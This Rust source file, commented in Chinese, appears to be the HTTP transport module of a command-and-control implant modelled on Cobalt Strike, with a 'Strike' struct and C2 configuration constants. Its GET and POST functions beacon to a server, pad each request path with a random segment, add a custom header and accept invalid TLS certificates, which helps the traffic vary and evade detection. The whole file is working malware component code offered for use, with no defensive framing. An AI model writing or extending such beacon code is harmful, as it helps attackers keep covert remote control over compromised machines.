use anyhow::Result;
use rand::Rng;
use reqwest::blocking::{Client, Response};
use reqwest::header::{COOKIE, USER_AGENT};
use url::Url; // 确保已添加 `url` crate // 确保已添加 `rand` crate

use crate::config::{C2_GET_RANDOM_MAX, C2_GET_RANDOM_MIN, C2_RANDOM}; // 引入最小和最大随机长度、随机header

pub struct Strike;

impl Strike {
    pub fn http_get(url: &str, cookie: &str, user_agent: &str) -> Result<Response> {
        // 解析传入的 URL
        let parsed_url = Url::parse(url)?;
        // let path = parsed_url.path().to_string(); // 获取请求路径/

        // 获取完整路径，包括查询参数
        // --->  admin.php?id=1
        let full_path = parsed_url.path().trim_start_matches('/').to_string()
            + &parsed_url
                .query()
                .map_or(String::new(), |q| format!("?{}", q));

        // 获取完整路径，包括查询参数
        // --->   /admin.php?id=1
        // let full_path = parsed_url.path().to_string() + &parsed_url.query().map_or(String::new(), |q| format!("?{}", q));

        // 随机生成指定范围的长度
        let random_length = rand::thread_rng().gen_range(C2_GET_RANDOM_MIN..=C2_GET_RANDOM_MAX);
        let random_path = generate_random_path(random_length); // 使用随机长度
        let new_url = format!(
            "{}://{}{}{}",
            parsed_url.scheme(),
            parsed_url.host_str().unwrap(),
            random_path,
            full_path
        );

        // 创建 HTTP 客户端
        let client = Client::builder()
            .danger_accept_invalid_certs(true) // 允许不受信任的证书，仅在开发中使用
            .build()?;

        // 发起 GET 请求
        client
            .get(&new_url)
            .header(COOKIE, cookie)
            .header(USER_AGENT, user_agent)
            .header(C2_RANDOM, random_length) // 假设 hello 头部的值为 "10"
            .send()
            .map_err(Into::into) // 转换错误
    }

    pub fn http_post(url: &str, cookie: &str, user_agent: &str, data: Vec<u8>) -> Result<Response> {
        // 解析传入的 URL
        let parsed_url = Url::parse(url)?;
        // let parsed_url = Url::parse(url_str).unwrap();

        let full_path = parsed_url.path().trim_start_matches('/').to_string()
            + &parsed_url
                .query()
                .map_or(String::new(), |q| format!("?{}", q));

        // 获取完整路径，包括查询参数
        // let full_path = parsed_url.path().to_string() + &parsed_url.query().map_or(String::new(), |q| format!("?{}", q));

        // println!("{}", full_path); // 输出：/xxxx?id=11111

        // 随机生成指定范围的长度
        let random_length = rand::thread_rng().gen_range(C2_GET_RANDOM_MIN..=C2_GET_RANDOM_MAX);
        let random_path = generate_random_path(random_length); // 使用随机长度
        let new_url = format!(
            "{}://{}{}{}",
            parsed_url.scheme(),
            parsed_url.host_str().unwrap(),
            random_path,
            full_path
        );

        let client = Client::builder()
            .danger_accept_invalid_certs(true) // 允许不受信任的证书，仅在开发中使用
            .build()?;

        client
            .post(&new_url)
            .header(COOKIE, cookie)
            .header(USER_AGENT, user_agent)
            .header(C2_RANDOM, random_length) // 假设 hello 头部的值为 "10"
            .body(data)
            .send()
            .map_err(Into::into) // 转换错误
    }
}

// 随机生成以 '/' 开头的字符串
fn generate_random_path(length: usize) -> String {
    // 不能出現 /?&  特殊符號
    let chars: Vec<char> = "abcdefghijklmnopqrstuvwxyz0123456789.".chars().collect();
    let mut rng = rand::thread_rng();
    let random_string: String = (0..length)
        .map(|_| chars[rng.gen_range(0..chars.len())])
        .collect();

    format!("/{}", random_string) // 添加前导的 '/'
}
